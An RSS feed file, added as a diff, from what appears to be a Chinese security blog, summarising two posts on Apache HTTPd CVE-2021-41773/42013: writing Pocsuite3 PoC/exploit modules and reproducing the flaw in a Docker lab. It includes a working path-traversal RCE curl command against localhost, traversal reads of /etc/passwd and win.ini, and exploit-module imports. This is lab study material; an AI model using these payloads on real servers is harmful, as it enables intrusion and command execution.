@@ -1,0 +1,64 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>CVE on Oulaa</title>
+    <link>/tags/cve/</link>
+    <description>Recent content in CVE on Oulaa</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <copyright>&amp;copy; 2021 &lt;a href=&#34;https://www.wangchucheng.com/&#34;&gt;C. Wang&lt;/a&gt; and &lt;a href=&#34;https://www.ruiqima.com/&#34;&gt;R. Ma&lt;/a&gt;
+</copyright>
+    <lastBuildDate>Mon, 11 Oct 2021 00:00:00 +0000</lastBuildDate><atom:link href="/tags/cve/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pocsuite3 POC/EXP编写</title>
+      <link>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</link>
+      <pubDate>Mon, 11 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/pocsuite3-%E4%BD%BF%E7%94%A8%E4%BB%A5%E5%8F%8Apoc%E7%BC%96%E5%86%99/</guid>
+      <description>Pocsuite3 是一个POC框架，用于漏洞的验证、攻击等等
+使用 https://github.com/knownsec/pocsuite3/blob/master/docs/USAGE.md
+Pocsuite3可以进行批量验证、攻击，它有三种模式verify（验证）、attack（攻击）、shell（获得shell），并且可以设置多种参数。
+编写POC 这里以CVE-2021-41773、CVE-2021-42013为例尝试使用Pocsuite3编写PoC与EXP：
+思路：
+分为linux与windows：
+ linux  发送post包检测是否可以RCE
+如果不可以的话发送get包检测是否可以目录穿越
+读取对象:/etc/passwd
+关键字：root
+ windows  由于windows的apache无法直接调用cmd执行命令，只能通过php.exe之类的来解析，所以不考虑RCE，只判断是否可以目录穿越读取文件。
+读取对象：c:/Windows/win.ini
+关键字：extensions
+由于两个RCE仅仅是URL编码的不同，所以这里直接使用二次URL编码来兼容两个RCE。
+ 注意：python的request请求包会自动进行一次编码，所以编写poc的时候不需要二次编码
+使用%2e即可
+实验发现不行，它会在编码之前先解码一次，解码之后会将..删除，所以换了urllib库。
+ 导入包 编写 PoC 实现类 DemoPOC，继承自 PoCBase 类
+1 2 3 4 5 6 7 8  from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD from pocsuite3.lib.utils import random_str class DemoPOC(POCBase): ...   PoC信息字段填写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  vulID = &amp;#39;0&amp;#39; # ssvid ID 如果是提交漏洞的同时提交 PoC，则写成 0 version = &amp;#39;1.</description>
+    </item>
+    
+    <item>
+      <title>CVE-2021-41773 Apache HTTPd (2.4.49)</title>
+      <link>/posts/41773/</link>
+      <pubDate>Sun, 10 Oct 2021 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/41773/</guid>
+      <description>一、 复现环境 https://github.com/blasty/CVE-2021-41773
+1  docker-compose build &amp;amp;&amp;amp; docker-compose up -d   二、目录穿越  不能在浏览器复现，会被自动去掉..
+ 三、RCE 前提：
+安装Apache之后，默认并不包含cgi 模块，需要我们自行安装以完成cgi解析，那么有没有可能在启用mod_cgi模块的前提下，实现RCE呢？
+所以前提是启用mod_cgid和mod_cgi模块。
+Linux上的apache实现回显RCE： 在linux上直接可以：
+1 2  curl -s --path-as-is -d &amp;#39;echo Content-Type: text/plain; echo; id&amp;#39; &amp;#34;http://localhost:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&amp;#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   使用burp：
+1  echo Content-Type: text/plain;echo;id   原理：
+直接执行命令无回显的且报500：
+原因是ap_scan_script_header_err_core_ex函数主要负责从cgi处理结果中读取输入，并确保输出格式符合一定要求。大体来说就是解析后的结果必须符合http协议规范，我们知道http请求分为header和body，且中间需要使用\r\n进行分割。
+也就是说，apache将cgi解析结果作为了http响应包的一部分。
+所以才有了如上构造的payload。
+windows上的RCE Windows版本的Apache通过目录穿越来读取cmd.exe，会提示mallformed header from script，无法实现命令执行。
+但是利用相应的cgi模块可以实现代码执行。
+参考资料 https://mp.weixin.qq.com/s/mx7_wTnU7IWxzeG7e6faTQ
+https://mp.weixin.qq.com/s?__biz=Mzg3MTU0MjkwNw==&amp;amp;mid=2247484889&amp;amp;idx=1&amp;amp;sn=3b3312b592554caa51e1cfcbacd832f0&amp;amp;chksm=cefdbccdf98a35dbf3ab94bb4fa60b63f6e6afd92224744cd496cd59658bee29e6e89cc801de&amp;amp;token=495462423&amp;amp;lang=zh_CN&amp;amp;scene=21#wechat_redirect</description>
+    </item>
+    
+  </channel>
+</rss>
